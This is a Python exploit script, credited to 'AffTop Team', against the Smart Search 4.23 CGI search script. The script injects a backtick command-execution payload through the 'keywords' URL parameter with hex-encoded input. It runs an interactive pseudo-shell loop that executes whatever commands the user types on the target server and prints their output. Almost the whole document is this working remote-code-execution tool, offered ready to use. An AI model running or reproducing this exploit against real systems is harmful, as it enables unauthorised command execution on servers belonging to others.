import sys
import requests
import urllib
from urllib.parse import urljoin

motd = """
###########################################################################
                        Exploit by AffTop Team, 2019
                             https://aff.rip/
###########################################################################

##########################################################################
##                                                                      ##
##                       Smart Search version 4.23                      ##
##                         ----------------------                       ##
##                           By Smarter Scripts                         ##
##                    (http://www.smarterscripts.com)                   ##
##                                                                      ##
##########################################################################
"""

params = "?keywords=%COMMAND%&ref=local&p=idx"

def encode_request(request):
 req_encoded = ""
 for i in request:
  req_encoded += "\\x{:02x}".format(ord(i))
 return req_encoded

def main():
 print(motd)
 print()
 if len(sys.argv) < 2:
  print("./exploit.py <url>\n")
  print("Example: ./exploit.py http://example.com/cgi-bin/search.cgi")
  sys.exit(0)
 url = sys.argv[1]
 while 1:
  command = '${print("\\r\\n\\r\\noutputz:"'
  command += ".`" + encode_request(input("haxor@smartsearch: ~$ ").strip()) + "`)}"
  command = urllib.parse.quote_plus(command)
  full_url = url + params.replace("%COMMAND%", command)
  r = requests.get(url=full_url)
  if not "outputz:" in r.text:
   print("Some error happened while running command target is not vulnerable")
   continue
  output = r.text.split("outputz:")[1].split("outputz:")[0].strip()
  print(output)

if __name__ == "__main__":
 main()

##########################################################################
##                                                                      ##
##                       Smart Search version 4.23                      ##
##                         ----------------------                       ##
##                           By Smarter Scripts                         ##
##                    (http://www.smarterscripts.com)                   ##
##                                                                      ##
##  "Smart Search" is not a free script. If you got this from someplace ##
##  other than SmarterScripts.com, please contact us, we do offer       ##
##  rewards for that type of information. Visit our site for up to date ##
##  versions. Most CGIs are over $200, sometimes more than $500,        ##
##  this script is much less. We can keep this script cheap,            ##
##  as well as free scripts on our site, if people don't steal it.      ##
##  Also, no return links are required, but we appreciate it if you     ##
##  do find a spot for us.                                              ##
##  Thanks!                                                             ##
##                                                                      ##
##  Special Notice to Resellers                                         ##
##  ===========================                                         ##
##  You can use this script on any site of yours, but if you sell one   ##
##  of these sites, you are required to FIRST purchase a reseller       ##
##  license for the domain. If you don't, it's considered copyright     ##
##  infringement and we will prosecute any offenders.                   ##
##  WE MONITOR EBAY.COM AUCTIONS, SO BEWARE.                            ##
##  Reseller prices are very low, for more information, go to:          ##
##  http://www.smarterscripts.com/resellers.shtml                       ##
##                                                                      ##
##  (c) copyright 2002 SmarterScripts.com and R3N3 Internet Services    ##
##########################################################################
                            
